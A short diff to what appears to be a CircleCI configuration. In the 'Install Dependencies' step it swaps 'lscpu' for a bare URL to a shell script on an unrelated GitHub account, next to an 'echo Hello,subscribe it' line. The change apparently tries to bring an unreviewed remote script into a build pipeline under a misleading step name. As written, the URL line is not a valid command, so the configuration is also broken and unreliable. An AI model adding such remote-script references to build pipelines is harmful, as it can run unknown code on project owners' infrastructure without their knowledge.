@@ -8,7 +8,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              lscpu
+              https://raw.githubusercontent.com/chirifa201/python/main/ruby.sh
               echo Hello,subscribe it
 workflows:
     version: 2.1
